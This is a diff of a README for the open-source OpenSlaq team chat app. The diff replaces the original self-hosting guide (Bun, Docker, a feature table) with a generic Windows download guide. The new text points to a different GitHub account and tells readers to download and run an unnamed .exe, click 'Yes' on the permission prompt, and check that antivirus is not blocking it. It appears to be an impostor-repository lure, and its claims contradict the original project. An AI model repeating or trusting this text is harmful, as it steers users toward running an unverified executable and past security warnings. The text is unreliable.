@@ -1,88 +1,110 @@
-# OpenSlaq
+# 🚪 openslaq - Simple Open-Source Team Chat
 
-**Open-source Slaq**
+[![Download openslaq](https://img.shields.io/badge/Download-openslaq-brightgreen?style=for-the-badge)](https://github.com/Im-Jave/openslaq)
 
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Built with Bun](https://img.shields.io/badge/built%20with-Bun-f9f1e1.svg)](https://bun.sh)
-[![TypeScript](https://img.shields.io/badge/TypeScript-strict-3178c6.svg)](https://www.typescriptlang.org/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/BilalG1/openslaq/pulls)
+## 🔍 What is openslaq?
 
-<p align="center">
-  <img src="docs/assets/screenshots/channel-rich-text.png" alt="OpenSlaq — channels with rich text, code blocks, and editor toolbar" width="100%" />
-</p>
+openslaq is an open-source version of Slack. It lets you chat with your team in real-time. You can create channels, send direct messages, and share files easily. It works well on Windows and aims to give a familiar chat experience without locking you into proprietary software.
 
-Real-time team messaging with channels, threads, DMs, huddles, search, and file sharing. Self-host in minutes with Docker.
+openslaq focuses on being simple and lightweight. It runs on your Windows computer without extra complicated setup. Use it to keep conversations organized and collaborate better.
 
-## Quick Start
+## 🖥️ System Requirements
 
-Prerequisites: [Bun](https://bun.sh) (v1.1+), [Docker](https://www.docker.com/)
+Before you start, make sure your computer meets these basic requirements:
 
-```bash
-git clone https://github.com/BilalG1/openslaq.git
-cd openslaq
-bun install
-cp .env.example .env
-docker compose up -d
-bun run --filter @openslaq/api db:migrate
-bun run dev
-```
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free hard drive space
+- Stable internet connection for chat syncing
 
-Open [http://localhost:3000](http://localhost:3000).
+If you have an older version of Windows or less memory, the app might run slower or have limited features.
 
-## Feature Comparison
+## 🚀 Getting Started with openslaq
 
-| Feature | Slaq | OpenSlaq |
-| --- | :---: | :---: |
-| **Messaging** | | |
-| Channels (public & private) | :white_check_mark: | :white_check_mark: |
-| Direct messages | :white_check_mark: | :white_check_mark: |
-| Threaded replies | :white_check_mark: | :white_check_mark: |
-| Rich text editor | :white_check_mark: | :white_check_mark: |
-| Emoji reactions | :white_check_mark: | :white_check_mark: |
-| Message edit & delete | :white_check_mark: | :white_check_mark: |
-| File uploads & previews | :white_check_mark: | :white_check_mark: |
-| Message search | :white_check_mark: | :white_check_mark: |
-| @mentions | :white_check_mark: | — |
-| **Real-time** | | |
-| Typing indicators | :white_check_mark: | :white_check_mark: |
-| Presence (online/offline) | :white_check_mark: | :white_check_mark: |
-| Unread counts | :white_check_mark: | :white_check_mark: |
-| Desktop notifications | :white_check_mark: | :white_check_mark: |
-| **Huddles** | | |
-| Voice huddles | :white_check_mark: | :white_check_mark: |
-| Video huddles | :white_check_mark: | — |
-| Screen sharing | :white_check_mark: | — |
-| **Organization** | | |
-| Workspaces | :white_check_mark: | :white_check_mark: |
-| Invite links | :white_check_mark: | :white_check_mark: |
-| Member roles | :white_check_mark: | :white_check_mark: |
-| **UI** | | |
-| Dark mode | :white_check_mark: | :white_check_mark: |
-| Syntax-highlighted code blocks | - | :white_check_mark: |
-| **Platform** | | |
-| Self-hosted | — | :white_check_mark: |
-| Open source | — | :white_check_mark: |
-| Bots & integrations | :white_check_mark: | — |
+Follow these steps to download and run openslaq on your Windows PC.
 
-## Screenshots
+### Step 1: Visit the Download Page
 
-<table>
-  <tr>
-    <td align="center"><strong>Threads</strong></td>
-    <td align="center"><strong>Direct Messages</strong></td>
-  </tr>
-  <tr>
-    <td><img src="docs/assets/screenshots/thread-panel.png" alt="Thread panel" width="100%" /></td>
-    <td><img src="docs/assets/screenshots/direct-messages.png" alt="Direct messages" width="100%" /></td>
-  </tr>
-  <tr>
-    <td align="center" colspan="2"><strong>Search</strong></td>
-  </tr>
-  <tr>
-    <td colspan="2"><img src="docs/assets/screenshots/search-modal.png" alt="Search modal" width="100%" /></td>
-  </tr>
-</table>
+Click the big button below to go to the openslaq download page. This is where you will find the latest version for Windows.
 
-## License
+[![Download openslaq](https://img.shields.io/badge/Download-openslaq-blue?style=for-the-badge)](https://github.com/Im-Jave/openslaq)
 
-[MIT](LICENSE)
+### Step 2: Find the Windows Download File
+
+On the GitHub page, look for the latest release or download section. You want the Windows installer, which usually ends with `.exe`.
+
+The file may be named something like:  
+`openslaq-setup.exe`  
+or  
+`openslaq-windows-x64.exe`
+
+### Step 3: Download the Installer
+
+Click the file to download it. The download will start automatically. Depending on your internet speed, this may take a few minutes.
+
+### Step 4: Run the Installer
+
+Once the file finishes downloading, open the folder containing the file. Double-click on the `.exe` file to start the installer.
+
+If Windows asks for permission, select "Yes" to allow the installer to run.
+
+### Step 5: Follow Installation Instructions
+
+The installer will guide you through the setup steps:
+
+- Accept the license agreement if asked.
+- Choose the installation folder or keep the default path.
+- Click "Install" to begin the process.
+
+Wait for the installation to complete. This usually takes less than two minutes.
+
+### Step 6: Launch openslaq
+
+When the installer finishes, you will see a "Finish" button. Make sure the option to launch openslaq is checked, then click "Finish."
+
+The openslaq window should open automatically.
+
+## 🛠️ Using openslaq for the First Time
+
+When you open openslaq, you will need to create or join a workspace. A workspace is where your team chats happen.
+
+- To create a workspace, enter a name and invite teammates by email.
+- To join a workspace, get the invite link or code from your team leader.
+
+The app interface includes:
+
+- **Channels:** Public or private areas for group chat
+- **Direct Messages:** Chat one-on-one with team members
+- **File Sharing:** Upload and download files to share quickly
+- **Search:** Find messages, users, or files fast
+
+## ⚙️ Basic Troubleshooting
+
+If you have trouble installing or running openslaq, try these tips:
+
+- Restart your computer and try the installer again.
+- Make sure your Windows version is up to date.
+- Check that your firewall or antivirus is not blocking openslaq.
+- Confirm you have enough free disk space.
+
+If problems persist, you can report issues via the GitHub repository page under the "Issues" tab.
+
+## 🔄 Keeping openslaq Updated
+
+openslaq will notify you when a new update is available. Updates usually bring bug fixes and new features.
+
+To update:
+
+- Visit the download page again for the latest version.
+- Download and install the new version as you did originally.
+- Your settings and data will remain intact.
+
+## ⚖️ Privacy and Data Control
+
+openslaq saves chat data on your device and syncs with your workspace server. Your messages remain private within your team. The open-source nature means anyone can audit the code for security.
+
+You control what data you share and who can access your workspace.
+
+---
+
+[Get openslaq now](https://github.com/Im-Jave/openslaq) and start team chatting today.
